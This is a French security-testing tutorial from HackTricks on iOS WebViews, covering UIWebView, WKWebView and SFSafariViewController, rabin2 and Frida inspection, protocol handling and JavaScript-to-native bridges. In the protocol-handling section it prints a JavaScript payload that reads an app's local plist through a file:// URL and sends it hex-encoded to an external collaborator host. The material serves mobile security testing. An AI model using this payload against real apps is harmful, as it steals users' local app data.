# iOS WebViews

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Le code de cette page a √©t√© extrait d'[ici](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Consultez la page pour plus de d√©tails.


## Types de WebViews

Les WebViews sont utilis√©s dans les applications pour afficher du contenu web de mani√®re interactive. Diff√©rents types de WebViews offrent diff√©rentes fonctionnalit√©s et caract√©ristiques de s√©curit√© pour les applications iOS. Voici un bref aper√ßu :

- **UIWebView**, qui n'est plus recommand√© √† partir d'iOS 12 en raison de son manque de prise en charge de la d√©sactivation de **JavaScript**, le rendant susceptible aux injections de script et aux attaques de **Cross-Site Scripting (XSS)**.

- **WKWebView** est l'option pr√©f√©r√©e pour incorporer du contenu web dans les applications, offrant un contr√¥le am√©lior√© sur le contenu et des fonctionnalit√©s de s√©curit√©. **JavaScript** est activ√© par d√©faut, mais peut √™tre d√©sactiv√© si n√©cessaire. Il prend √©galement en charge des fonctionnalit√©s pour emp√™cher JavaScript d'ouvrir automatiquement des fen√™tres et garantit que tout le contenu est charg√© de mani√®re s√©curis√©e. De plus, l'architecture de **WKWebView** r√©duit au minimum le risque de corruption de la m√©moire affectant le processus principal de l'application.

- **SFSafariViewController** offre une exp√©rience de navigation web standardis√©e au sein des applications, reconnaissable par sa mise en page sp√©cifique comprenant un champ d'adresse en lecture seule, des boutons de partage et de navigation, et un lien direct pour ouvrir le contenu dans Safari. Contrairement √† **WKWebView**, **JavaScript** ne peut pas √™tre d√©sactiv√© dans **SFSafariViewController**, qui partage √©galement des cookies et des donn√©es avec Safari, pr√©servant la confidentialit√© de l'utilisateur depuis l'application. Il doit √™tre affich√© de mani√®re prominente conform√©ment aux directives de l'App Store.
```objetivec
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## R√©sum√© de l'Exploration de la Configuration des WebViews

### **Aper√ßu de l'Analyse Statique**

Dans le processus d'examen des configurations des **WebViews**, deux types principaux sont mis en avant : **UIWebView** et **WKWebView**. Pour identifier ces WebViews dans un binaire, des commandes sont utilis√©es, recherchant des r√©f√©rences de classes sp√©cifiques et des m√©thodes d'initialisation.

- **Identification de UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Ce commandement aide √† localiser les instances de **UIWebView** en recherchant des cha√Ænes de texte qui y sont li√©es dans le binaire.

- **Identification de WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
De m√™me, pour **WKWebView**, cette commande recherche dans le binaire les cha√Ænes de texte indicatives de son utilisation.

De plus, pour trouver comment un **WKWebView** est initialis√©, la commande suivante est ex√©cut√©e, ciblant la signature de m√©thode li√©e √† son initialisation :
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **V√©rification de la configuration JavaScript**

Pour **WKWebView**, il est soulign√© que la d√©sactivation de JavaScript est une meilleure pratique sauf si n√©cessaire. Le binaire compil√© est recherch√© pour confirmer que la propri√©t√© `javaScriptEnabled` est d√©finie sur `false`, garantissant que JavaScript est d√©sactiv√©:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **V√©rification du contenu s√©curis√© uniquement**

**WKWebView** offre la possibilit√© d'identifier les probl√®mes de contenu mixte, contrairement √† **UIWebView**. Cela est v√©rifi√© en utilisant la propri√©t√© `hasOnlySecureContent` pour garantir que toutes les ressources de la page sont charg√©es via des connexions s√©curis√©es. La recherche dans le binaire compil√© est effectu√©e comme suit:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Perspectives de l'analyse dynamique**

L'analyse dynamique implique l'inspection du tas pour les instances de WebView et leurs propri√©t√©s. Un script nomm√© `webviews_inspector.js` est utilis√© √† cette fin, ciblant les instances `UIWebView`, `WKWebView` et `SFSafariViewController`. Il enregistre des informations sur les instances trouv√©es, y compris les URL et les param√®tres li√©s √† JavaScript et au contenu s√©curis√©.

L'inspection du tas peut √™tre effectu√©e en utilisant `ObjC.choose()` pour identifier les instances de WebView et v√©rifier les propri√©t√©s `javaScriptEnabled` et `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```objetivec
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Le script est ex√©cut√© avec :
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**R√©sultats cl√©s**:
- Les instances de WebViews sont localis√©es et inspect√©es avec succ√®s.
- L'activation de JavaScript et les param√®tres de contenu s√©curis√© sont v√©rifi√©s.

Cette synth√®se r√©sume les √©tapes critiques et les commandes impliqu√©es dans l'analyse des configurations de WebView √† travers des approches statiques et dynamiques, en mettant l'accent sur les fonctionnalit√©s de s√©curit√© telles que l'activation de JavaScript et la d√©tection de contenu mixte.

## Gestion des protocoles WebView

La gestion du contenu dans les WebViews est un aspect critique, surtout lorsqu'il s'agit de diff√©rents protocoles tels que `http(s)://`, `file://` et `tel://`. Ces protocoles permettent le chargement de contenu √† la fois distant et local dans les applications. Il est soulign√© que lors du chargement de contenu local, des pr√©cautions doivent √™tre prises pour emp√™cher les utilisateurs d'influencer le nom ou le chemin du fichier et d'√©diter le contenu lui-m√™me.

Les **WebViews** offrent diff√©rentes m√©thodes de chargement de contenu. Pour **UIWebView**, d√©sormais obsol√®te, des m√©thodes comme `loadHTMLString:baseURL:` et `loadData:MIMEType:textEncodingName:baseURL:` sont utilis√©es. **WKWebView**, quant √† lui, utilise `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` et `loadRequest:` pour le contenu web. Des m√©thodes telles que `pathForResource:ofType:`, `URLForResource:withExtension:` et `init(contentsOf:encoding:)` sont g√©n√©ralement utilis√©es pour charger des fichiers locaux. La m√©thode `loadFileURL:allowingReadAccessToURL:` est particuli√®rement notable pour sa capacit√© √† charger une URL ou un r√©pertoire sp√©cifique dans la WebView, exposant potentiellement des donn√©es sensibles si un r√©pertoire est sp√©cifi√©.

Pour trouver ces m√©thodes dans le code source ou le binaire compil√©, des commandes comme celles-ci peuvent √™tre utilis√©es:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
En ce qui concerne **l'acc√®s aux fichiers**, UIWebView le permet de mani√®re universelle, tandis que WKWebView introduit les param√®tres `allowFileAccessFromFileURLs` et `allowUniversalAccessFromFileURLs` pour g√©rer l'acc√®s √† partir d'URL de fichiers, les deux √©tant par d√©faut √† false.

Un exemple de script Frida est fourni pour inspecter les configurations de **WKWebView** pour les param√®tres de s√©curit√© :
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Enfin, un exemple de charge utile JavaScript visant √† exfiltrer des fichiers locaux d√©montre le risque potentiel pour la s√©curit√© associ√© √† des WebViews mal configur√©s. Cette charge utile encode le contenu du fichier au format hexad√©cimal avant de les transmettre √† un serveur, soulignant l'importance de mesures de s√©curit√© strictes dans les impl√©mentations de WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M√©thodes natives expos√©es via les WebViews

## Comprendre les interfaces natives des WebViews sur iOS

√Ä partir d'iOS 7, Apple a fourni des API pour la **communication entre JavaScript dans un WebView et les objets natifs** Swift ou Objective-C. Cette int√©gration est principalement facilit√©e par deux m√©thodes :

- **JSContext** : Une fonction JavaScript est automatiquement cr√©√©e lorsqu'un bloc Swift ou Objective-C est li√© √† un identifiant dans un `JSContext`. Cela permet une int√©gration et une communication transparentes entre JavaScript et le code natif.
- **Protocole JSExport** : En h√©ritant du protocole `JSExport`, les propri√©t√©s natives, les m√©thodes d'instance et les m√©thodes de classe peuvent √™tre expos√©es √† JavaScript. Cela signifie que tout changement apport√© dans l'environnement JavaScript est refl√©t√© dans l'environnement natif, et vice versa. Cependant, il est essentiel de s'assurer que des donn√©es sensibles ne sont pas expos√©es involontairement par cette m√©thode.

### Acc√®s √† `JSContext` en Objective-C

En Objective-C, le `JSContext` pour un `UIWebView` peut √™tre r√©cup√©r√© avec la ligne de code suivante :
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Communication avec `WKWebView`

Pour `WKWebView`, l'acc√®s direct √† `JSContext` n'est pas disponible. Au lieu de cela, la communication se fait via la fonction `postMessage`, permettant √† JavaScript de communiquer avec l'application native. Les gestionnaires de ces messages sont configur√©s comme suit, permettant √† JavaScript d'interagir avec l'application native de mani√®re s√©curis√©e:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interaction et Test

JavaScript peut interagir avec la couche native en d√©finissant un gestionnaire de messages de script. Cela permet des op√©rations telles que l'invocation de fonctions natives √† partir d'une page web :
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Pour capturer et manipuler le r√©sultat d'un appel de fonction native, on peut remplacer la fonction de rappel dans le HTML :
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
La partie native g√®re l'appel JavaScript comme indiqu√© dans la classe `JavaScriptBridgeMessageHandler`, o√π le r√©sultat d'op√©rations telles que la multiplication de nombres est trait√© et renvoy√© √† JavaScript pour affichage ou manipulation ult√©rieure :
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## D√©bogage des WebViews iOS

(Tutoriel bas√© sur celui de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Pour d√©boguer efficacement le contenu web dans les WebViews iOS, une configuration sp√©cifique impliquant les outils de d√©veloppement de Safari est n√©cessaire, car les messages envoy√©s √† `console.log()` ne s'affichent pas dans les journaux Xcode. Voici un guide simplifi√©, mettant en avant les √©tapes cl√©s et les exigences :

- **Pr√©paration sur l'appareil iOS** : L'inspecteur Web de Safari doit √™tre activ√© sur votre appareil iOS. Pour ce faire, allez dans **R√©glages > Safari > Avanc√©**, et activez l'_Inspecteur Web_.

- **Pr√©paration sur l'appareil macOS** : Sur votre machine de d√©veloppement macOS, vous devez activer les outils de d√©veloppement dans Safari. Lancez Safari, acc√©dez √† **Safari > Pr√©f√©rences > Avanc√©**, et s√©lectionnez l'option _Afficher le menu D√©veloppement_.

- **Connexion et D√©bogage** : Apr√®s avoir connect√© votre appareil iOS √† votre ordinateur macOS et lanc√© votre application, utilisez Safari sur votre appareil macOS pour s√©lectionner la WebView que vous souhaitez d√©boguer. Naviguez jusqu'√† _D√©velopper_ dans la barre de menu de Safari, survolez le nom de votre appareil iOS pour voir une liste des instances de WebView, et s√©lectionnez l'instance que vous souhaitez inspecter. Une nouvelle fen√™tre de l'inspecteur Web de Safari s'ouvrira √† cette fin.

Cependant, soyez conscient des limitations :

- Le d√©bogage avec cette m√©thode n√©cessite un appareil macOS car il d√©pend de Safari.
- Seules les WebViews dans les applications charg√©es sur votre appareil via Xcode sont √©ligibles pour le d√©bogage. Les WebViews dans les applications install√©es via l'App Store ou Apple Configurator ne peuvent pas √™tre d√©bogu√©es de cette mani√®re.


## R√©f√©rences

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
